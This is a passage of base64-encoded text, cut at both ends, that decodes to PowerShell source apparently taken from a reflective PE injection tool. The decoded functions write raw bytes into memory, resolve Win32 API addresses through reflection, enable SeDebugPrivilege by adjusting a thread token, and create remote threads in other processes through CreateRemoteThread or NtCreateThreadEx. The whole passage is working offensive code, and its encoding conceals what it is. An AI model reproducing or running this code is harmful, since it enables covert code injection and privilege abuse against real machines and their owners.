ICAgICAgIFRocm93ICJDYW5ub3QgYWRkIGJ5dGVhcnJheXMgb2YgZGlmZmVyZW50IHNpemVzIgogICAgICAgIH0KICAgICAgICAKICAgICAgICByZXR1cm4gW0JpdENvbnZlcnRlcl06OlRvSW50NjQoJEZpbmFsQnl0ZXMsIDApCiAgICB9CiAgICAKCiAgICBGdW5jdGlvbiBDb21wYXJlLVZhbDFHcmVhdGVyVGhhblZhbDJBc1VJbnQKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtJbnQ2NF0KICAgICAgICAkVmFsdWUxLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW0ludDY0XQogICAgICAgICRWYWx1ZTIKICAgICAgICApCiAgICAgICAgCiAgICAgICAgW0J5dGVbXV0kVmFsdWUxQnl0ZXMgPSBbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJFZhbHVlMSkKICAgICAgICBbQnl0ZVtdXSRWYWx1ZTJCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkVmFsdWUyKQoKICAgICAgICBpZiAoJFZhbHVlMUJ5dGVzLkNvdW50IC1lcSAkVmFsdWUyQnl0ZXMuQ291bnQpCiAgICAgICAgewogICAgICAgICAgICBmb3IgKCRpID0gJFZhbHVlMUJ5dGVzLkNvdW50LTE7ICRpIC1nZSAwOyAkaS0tKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoJFZhbHVlMUJ5dGVzWyRpXSAtZ3QgJFZhbHVlMkJ5dGVzWyRpXSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZiAoJFZhbHVlMUJ5dGVzWyRpXSAtbHQgJFZhbHVlMkJ5dGVzWyRpXSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gJGZhbHNlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIkNhbm5vdCBjb21wYXJlIGJ5dGUgYXJyYXlzIG9mIGRpZmZlcmVudCBzaXplIgogICAgICAgIH0KICAgICAgICAKICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9CiAgICAKCiAgICBGdW5jdGlvbiBDb252ZXJ0LVVJbnRUb0ludAogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1VJbnQ2NF0KICAgICAgICAkVmFsdWUKICAgICAgICApCiAgICAgICAgCiAgICAgICAgW0J5dGVbXV0kVmFsdWVCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkVmFsdWUpCiAgICAgICAgcmV0dXJuIChbQml0Q29udmVydGVyXTo6VG9JbnQ2NCgkVmFsdWVCeXRlcywgMCkpCiAgICB9CgoKICAgIEZ1bmN0aW9uIEdldC1IZXgKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgICRWYWx1ZSAjV2Ugd2lsbCBkZXRlcm1pbmUgdGhlIHR5cGUgZHluYW1pY2FsbHkKICAgICAgICApCgogICAgICAgICRWYWx1ZVNpemUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdJFZhbHVlLkdldFR5cGUoKSkgKiAyCiAgICAgICAgJEhleCA9ICIweHswOlgkKCRWYWx1ZVNpemUpfSIgLWYgW0ludDY0XSRWYWx1ZSAjUGFzc2luZyBhIEludFB0ciB0byB0aGlzIGRvZXNuJ3Qgd29yayB3ZWxsLiBDYXN0IHRvIEludDY0IGZpcnN0LgoKICAgICAgICByZXR1cm4gJEhleAogICAgfQogICAgCiAgICAKICAgIEZ1bmN0aW9uIFRlc3QtTWVtb3J5UmFuZ2VWYWxpZAogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRGVidWdTdHJpbmcsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkUEVJbmZvLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW0ludFB0cl0KICAgICAgICAkU3RhcnRBZGRyZXNzLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICJFbmRBZGRyZXNzIiwgUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW0ludFB0cl0KICAgICAgICAkRW5kQWRkcmVzcywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAiU2l6ZSIsIFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtJbnRQdHJdCiAgICAgICAgJFNpemUKICAgICAgICApCiAgICAgICAgCiAgICAgICAgW0ludFB0cl0kRmluYWxFbmRBZGRyZXNzID0gW0ludFB0cl06Olplcm8KICAgICAgICBpZiAoJFBzQ21kbGV0LlBhcmFtZXRlclNldE5hbWUgLWVxICJTaXplIikKICAgICAgICB7CiAgICAgICAgICAgIFtJbnRQdHJdJEZpbmFsRW5kQWRkcmVzcyA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkU3RhcnRBZGRyZXNzKSAoJFNpemUpKQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAkRmluYWxFbmRBZGRyZXNzID0gJEVuZEFkZHJlc3MKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJFBFRW5kQWRkcmVzcyA9ICRQRUluZm8uRW5kQWRkcmVzcwogICAgICAgIAogICAgICAgIGlmICgoQ29tcGFyZS1WYWwxR3JlYXRlclRoYW5WYWwyQXNVSW50ICgkUEVJbmZvLlBFSGFuZGxlKSAoJFN0YXJ0QWRkcmVzcykpIC1lcSAkdHJ1ZSkKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJUcnlpbmcgdG8gd3JpdGUgdG8gbWVtb3J5IHNtYWxsZXIgdGhhbiBhbGxvY2F0ZWQgYWRkcmVzcyByYW5nZS4gJERlYnVnU3RyaW5nIgogICAgICAgIH0KICAgICAgICBpZiAoKENvbXBhcmUtVmFsMUdyZWF0ZXJUaGFuVmFsMkFzVUludCAoJEZpbmFsRW5kQWRkcmVzcykgKCRQRUVuZEFkZHJlc3MpKSAtZXEgJHRydWUpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVHJ5aW5nIHRvIHdyaXRlIHRvIG1lbW9yeSBncmVhdGVyIHRoYW4gYWxsb2NhdGVkIGFkZHJlc3MgcmFuZ2UuICREZWJ1Z1N0cmluZyIKICAgICAgICB9CiAgICB9CiAgICAKICAgIAogICAgRnVuY3Rpb24gV3JpdGUtQnl0ZXNUb01lbW9yeQogICAgewogICAgICAgIFBhcmFtKAogICAgICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICAgICAgW0J5dGVbXV0KICAgICAgICAgICAgJEJ5dGVzLAogICAgICAgICAgICAKICAgICAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbj0xLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgICAgIFtJbnRQdHJdCiAgICAgICAgICAgICRNZW1vcnlBZGRyZXNzCiAgICAgICAgKQogICAgCiAgICAgICAgZm9yICgkT2Zmc2V0ID0gMDsgJE9mZnNldCAtbHQgJEJ5dGVzLkxlbmd0aDsgJE9mZnNldCsrKQogICAgICAgIHsKICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6V3JpdGVCeXRlKCRNZW1vcnlBZGRyZXNzLCAkT2Zmc2V0LCAkQnl0ZXNbJE9mZnNldF0pCiAgICAgICAgfQogICAgfQogICAgCgogICAgI0Z1bmN0aW9uIHdyaXR0ZW4gYnkgTWF0dCBHcmFlYmVyLCBUd2l0dGVyOiBAbWF0dGlmZXN0YXRpb24sIEJsb2c6IGh0dHA6Ly93d3cuZXhwbG9pdC1tb25kYXkuY29tLwogICAgRnVuY3Rpb24gR2V0LURlbGVnYXRlVHlwZQogICAgewogICAgICAgIFBhcmFtCiAgICAgICAgKAogICAgICAgICAgICBbT3V0cHV0VHlwZShbVHlwZV0pXQogICAgICAgICAgICAKICAgICAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAwKV0KICAgICAgICAgICAgW1R5cGVbXV0KICAgICAgICAgICAgJFBhcmFtZXRlcnMgPSAoTmV3LU9iamVjdCBUeXBlW10oMCkpLAogICAgICAgICAgICAKICAgICAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAxICldCiAgICAgICAgICAgIFtUeXBlXQogICAgICAgICAgICAkUmV0dXJuVHlwZSA9IFtWb2lkXQogICAgICAgICkKCiAgICAgICAgJERvbWFpbiA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluCiAgICAgICAgJER5bkFzc2VtYmx5ID0gTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoJ1JlZmxlY3RlZERlbGVnYXRlJykKICAgICAgICAkQXNzZW1ibHlCdWlsZGVyID0gJERvbWFpbi5EZWZpbmVEeW5hbWljQXNzZW1ibHkoJER5bkFzc2VtYmx5LCBbU3lzdGVtLlJlZmxlY3Rpb24uRW1pdC5Bc3NlbWJseUJ1aWxkZXJBY2Nlc3NdOjpSdW4pCiAgICAgICAgJE1vZHVsZUJ1aWxkZXIgPSAkQXNzZW1ibHlCdWlsZGVyLkRlZmluZUR5bmFtaWNNb2R1bGUoJ0luTWVtb3J5TW9kdWxlJywgJGZhbHNlKQogICAgICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKICAgICAgICAkQ29uc3RydWN0b3JCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJFBhcmFtZXRlcnMpCiAgICAgICAgJENvbnN0cnVjdG9yQnVpbGRlci5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKICAgICAgICAkTWV0aG9kQnVpbGRlciA9ICRUeXBlQnVpbGRlci5EZWZpbmVNZXRob2QoJ0ludm9rZScsICdQdWJsaWMsIEhpZGVCeVNpZywgTmV3U2xvdCwgVmlydHVhbCcsICRSZXR1cm5UeXBlLCAkUGFyYW1ldGVycykKICAgICAgICAkTWV0aG9kQnVpbGRlci5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKICAgICAgICAKICAgICAgICBXcml0ZS1PdXRwdXQgJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQogICAgfQoKCiAgICAjRnVuY3Rpb24gd3JpdHRlbiBieSBNYXR0IEdyYWViZXIsIFR3aXR0ZXI6IEBtYXR0aWZlc3RhdGlvbiwgQmxvZzogaHR0cDovL3d3dy5leHBsb2l0LW1vbmRheS5jb20vCiAgICBGdW5jdGlvbiBHZXQtUHJvY0FkZHJlc3MKICAgIHsKICAgICAgICBQYXJhbQogICAgICAgICgKICAgICAgICAgICAgW091dHB1dFR5cGUoW0ludFB0cl0pXQogICAgICAgIAogICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlICldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICRNb2R1bGUsCiAgICAgICAgICAgIAogICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRUcnVlICldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICRQcm9jZWR1cmUKICAgICAgICApCgogICAgICAgICMgR2V0IGEgcmVmZXJlbmNlIHRvIFN5c3RlbS5kbGwgaW4gdGhlIEdBQwogICAgICAgICRTeXN0ZW1Bc3NlbWJseSA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfQogICAgICAgICRVbnNhZmVOYXRpdmVNZXRob2RzID0gJFN5c3RlbUFzc2VtYmx5LkdldFR5cGUoJ01pY3Jvc29mdC5XaW4zMi5VbnNhZmVOYXRpdmVNZXRob2RzJykKICAgICAgICAjIEdldCBhIHJlZmVyZW5jZSB0byB0aGUgR2V0TW9kdWxlSGFuZGxlIGFuZCBHZXRQcm9jQWRkcmVzcyBtZXRob2RzCiAgICAgICAgJEdldE1vZHVsZUhhbmRsZSA9ICRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgnR2V0TW9kdWxlSGFuZGxlJykKICAgICAgICAkR2V0UHJvY0FkZHJlc3MgPSAkVW5zYWZlTmF0aXZlTWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJykKICAgICAgICAjIEdldCBhIGhhbmRsZSB0byB0aGUgbW9kdWxlIHNwZWNpZmllZAogICAgICAgICRLZXJuMzJIYW5kbGUgPSAkR2V0TW9kdWxlSGFuZGxlLkludm9rZSgkbnVsbCwgQCgkTW9kdWxlKSkKICAgICAgICAkdG1wUHRyID0gTmV3LU9iamVjdCBJbnRQdHIKICAgICAgICAkSGFuZGxlUmVmID0gTmV3LU9iamVjdCBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuSGFuZGxlUmVmKCR0bXBQdHIsICRLZXJuMzJIYW5kbGUpCgogICAgICAgICMgUmV0dXJuIHRoZSBhZGRyZXNzIG9mIHRoZSBmdW5jdGlvbgogICAgICAgIFdyaXRlLU91dHB1dCAkR2V0UHJvY0FkZHJlc3MuSW52b2tlKCRudWxsLCBAKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuSGFuZGxlUmVmXSRIYW5kbGVSZWYsICRQcm9jZWR1cmUpKQogICAgfQogICAgCiAgICAKICAgIEZ1bmN0aW9uIEVuYWJsZS1TZURlYnVnUHJpdmlsZWdlCiAgICB7CiAgICAgICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJGdW5jdGlvbnMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJUeXBlcywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRXaW4zMkNvbnN0YW50cwogICAgICAgICkKICAgICAgICAKICAgICAgICBbSW50UHRyXSRUaHJlYWRIYW5kbGUgPSAkV2luMzJGdW5jdGlvbnMuR2V0Q3VycmVudFRocmVhZC5JbnZva2UoKQogICAgICAgIGlmICgkVGhyZWFkSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gZ2V0IHRoZSBoYW5kbGUgdG8gdGhlIGN1cnJlbnQgdGhyZWFkIgogICAgICAgIH0KICAgICAgICAKICAgICAgICBbSW50UHRyXSRUaHJlYWRUb2tlbiA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgW0Jvb2xdJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5PcGVuVGhyZWFkVG9rZW4uSW52b2tlKCRUaHJlYWRIYW5kbGUsICRXaW4zMkNvbnN0YW50cy5UT0tFTl9RVUVSWSAtYm9yICRXaW4zMkNvbnN0YW50cy5UT0tFTl9BREpVU1RfUFJJVklMRUdFUywgJGZhbHNlLCBbUmVmXSRUaHJlYWRUb2tlbikKICAgICAgICBpZiAoJFJlc3VsdCAtZXEgJGZhbHNlKQogICAgICAgIHsKICAgICAgICAgICAgJEVycm9yQ29kZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKICAgICAgICAgICAgaWYgKCRFcnJvckNvZGUgLWVxICRXaW4zMkNvbnN0YW50cy5FUlJPUl9OT19UT0tFTikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5JbXBlcnNvbmF0ZVNlbGYuSW52b2tlKDMpCiAgICAgICAgICAgICAgICBpZiAoJFJlc3VsdCAtZXEgJGZhbHNlKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gaW1wZXJzb25hdGUgc2VsZiIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5PcGVuVGhyZWFkVG9rZW4uSW52b2tlKCRUaHJlYWRIYW5kbGUsICRXaW4zMkNvbnN0YW50cy5UT0tFTl9RVUVSWSAtYm9yICRXaW4zMkNvbnN0YW50cy5UT0tFTl9BREpVU1RfUFJJVklMRUdFUywgJGZhbHNlLCBbUmVmXSRUaHJlYWRUb2tlbikKICAgICAgICAgICAgICAgIGlmICgkUmVzdWx0IC1lcSAkZmFsc2UpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBPcGVuVGhyZWFkVG9rZW4uIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBPcGVuVGhyZWFkVG9rZW4uIEVycm9yIGNvZGU6ICRFcnJvckNvZGUiCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgCiAgICAgICAgW0ludFB0cl0kUEx1aWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXSRXaW4zMlR5cGVzLkxVSUQpKQogICAgICAgICRSZXN1bHQgPSAkV2luMzJGdW5jdGlvbnMuTG9va3VwUHJpdmlsZWdlVmFsdWUuSW52b2tlKCRudWxsLCAiU2VEZWJ1Z1ByaXZpbGVnZSIsICRQTHVpZCkKICAgICAgICBpZiAoJFJlc3VsdCAtZXEgJGZhbHNlKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBjYWxsIExvb2t1cFByaXZpbGVnZVZhbHVlIgogICAgICAgIH0KCiAgICAgICAgW1VJbnQzMl0kVG9rZW5Qcml2U2l6ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kV2luMzJUeXBlcy5UT0tFTl9QUklWSUxFR0VTKQogICAgICAgIFtJbnRQdHJdJFRva2VuUHJpdmlsZWdlc01lbSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkVG9rZW5Qcml2U2l6ZSkKICAgICAgICAkVG9rZW5Qcml2aWxlZ2VzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFRva2VuUHJpdmlsZWdlc01lbSwgW1R5cGVdJFdpbjMyVHlwZXMuVE9LRU5fUFJJVklMRUdFUykKICAgICAgICAkVG9rZW5Qcml2aWxlZ2VzLlByaXZpbGVnZUNvdW50ID0gMQogICAgICAgICRUb2tlblByaXZpbGVnZXMuUHJpdmlsZWdlcy5MdWlkID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFBMdWlkLCBbVHlwZV0kV2luMzJUeXBlcy5MVUlEKQogICAgICAgICRUb2tlblByaXZpbGVnZXMuUHJpdmlsZWdlcy5BdHRyaWJ1dGVzID0gJFdpbjMyQ29uc3RhbnRzLlNFX1BSSVZJTEVHRV9FTkFCTEVECiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJFRva2VuUHJpdmlsZWdlcywgJFRva2VuUHJpdmlsZWdlc01lbSwgJHRydWUpCgogICAgICAgICRSZXN1bHQgPSAkV2luMzJGdW5jdGlvbnMuQWRqdXN0VG9rZW5Qcml2aWxlZ2VzLkludm9rZSgkVGhyZWFkVG9rZW4sICRmYWxzZSwgJFRva2VuUHJpdmlsZWdlc01lbSwgJFRva2VuUHJpdlNpemUsIFtJbnRQdHJdOjpaZXJvLCBbSW50UHRyXTo6WmVybykKICAgICAgICAkRXJyb3JDb2RlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKSAjTmVlZCB0aGlzIHRvIGdldCBzdWNjZXNzIHZhbHVlIG9yIGZhaWx1cmUgdmFsdWUKICAgICAgICBpZiAoKCRSZXN1bHQgLWVxICRmYWxzZSkgLW9yICgkRXJyb3JDb2RlIC1uZSAwKSkKICAgICAgICB7CiAgICAgICAgICAgICNUaHJvdyAiVW5hYmxlIHRvIGNhbGwgQWRqdXN0VG9rZW5Qcml2aWxlZ2VzLiBSZXR1cm4gdmFsdWU6ICRSZXN1bHQsIEVycm9yY29kZTogJEVycm9yQ29kZSIgICAjdG9kbyBuZWVkIHRvIGRldGVjdCBpZiBhbHJlYWR5IHNldAogICAgICAgIH0KICAgICAgICAKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpGcmVlSEdsb2JhbCgkVG9rZW5Qcml2aWxlZ2VzTWVtKQogICAgfQogICAgCiAgICAKICAgIEZ1bmN0aW9uIENyZWF0ZS1SZW1vdGVUaHJlYWQKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtJbnRQdHJdCiAgICAgICAgJFByb2Nlc3NIYW5kbGUsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbSW50UHRyXQogICAgICAgICRTdGFydEFkZHJlc3MsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW0ludFB0cl0KICAgICAgICAkQXJndW1lbnRQdHIgPSBbSW50UHRyXTo6WmVybywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRXaW4zMkZ1bmN0aW9ucwogICAgICAgICkKICAgICAgICAKICAgICAgICBbSW50UHRyXSRSZW1vdGVUaHJlYWRIYW5kbGUgPSBbSW50UHRyXTo6WmVybwogICAgICAgIAogICAgICAgICRPU1ZlcnNpb24gPSBbRW52aXJvbm1lbnRdOjpPU1ZlcnNpb24uVmVyc2lvbgogICAgICAgICNWaXN0YSBhbmQgV2luNwogICAgICAgIGlmICgoJE9TVmVyc2lvbiAtZ2UgKE5ldy1PYmplY3QgJ1ZlcnNpb24nIDYsMCkpIC1hbmQgKCRPU1ZlcnNpb24gLWx0IChOZXctT2JqZWN0ICdWZXJzaW9uJyA2LDIpKSkKICAgICAgICB7CiAgICAgICAgICAgICNXcml0ZS1WZXJib3NlICJXaW5kb3dzIFZpc3RhLzcgZGV0ZWN0ZWQsIHVzaW5nIE50Q3JlYXRlVGhyZWFkRXguIEFkZHJlc3Mgb2YgdGhyZWFkOiAkU3RhcnRBZGRyZXNzIgogICAgICAgICAgICAkUmV0VmFsPSAkV2luMzJGdW5jdGlvbnMuTnRDcmVhdGVUaHJlYWRFeC5JbnZva2UoW1JlZl0kUmVtb3RlVGhyZWFkSGFuZGxlLCAweDFGRkZGRiwgW0ludFB0cl06Olplcm8sICRQcm9jZXNzSGFuZGxlLCAkU3RhcnRBZGRyZXNzLCAkQXJndW1lbnRQdHIsICRmYWxzZSwgMCwgMHhmZmZmLCAweGZmZmYsIFtJbnRQdHJdOjpaZXJvKQogICAgICAgICAgICAkTGFzdEVycm9yID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQogICAgICAgICAgICBpZiAoJFJlbW90ZVRocmVhZEhhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICJFcnJvciBpbiBOdENyZWF0ZVRocmVhZEV4LiBSZXR1cm4gdmFsdWU6ICRSZXRWYWwuIExhc3RFcnJvcjogJExhc3RFcnJvciIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAjWFAvV2luOAogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICNXcml0ZS1WZXJib3NlICJXaW5kb3dzIFhQLzggZGV0ZWN0ZWQsIHVzaW5nIENyZWF0ZVJlbW90ZVRocmVhZC4gQWRkcmVzcyBvZiB0aHJlYWQ6ICRTdGFydEFkZHJlc3MiCiAgICAgICAgICAgICRSZW1vdGVUaHJlYWRIYW5kbGUgPSAkV2luMzJGdW5jdGlvbnMuQ3JlYXRlUmVtb3RlVGhyZWFkLkludm9rZSgkUHJvY2Vzc0hhbmRsZSwgW0ludFB0cl06Olplcm8sIFtVSW50UHRyXVtVSW50NjRdMHhGRkZGLCAkU3RhcnRBZGRyZXNzLCAkQXJndW1lbnRQdHIsIDAsIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIH0KICAgICAgICAKICAgICAgICBpZiAoJFJlbW90ZVRocmVhZEhhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1FcnJvciAiRXJyb3IgY3JlYXRpbmcgcmVtb3RlIHRocmVhZCwgdGhyZWFkIGhhbmRsZSBpcyBudWxsIiAtRXJyb3JBY3Rpb24gU3RvcAogICAgICAgIH0KICAgICAgICAKICAgICAgICByZXR1cm4gJFJlbW90ZVRocmVhZEhhbmRsZQogICAgfQoKICAgIAoKICAgIEZ1bmN0aW9uIEdldC1JbWFnZU50SGVhZGVycwogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW0ludFB0cl0KICAgICAgICAkUEVIYW5kbGUsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJUeXBlcwogICAgICAgICkKICAgICAgICAKICAgICAgICAkTnRIZWFkZXJzSW5mbyA9IE5ldy1PYmplY3QgU3lzdGVtLk9iamVjdAogICAgICAgIAogICAgICAgICNOb3JtYWxseSB3b3VsZCB2YWxpZGF0ZSBET1NIZWFkZXIgaGVyZSw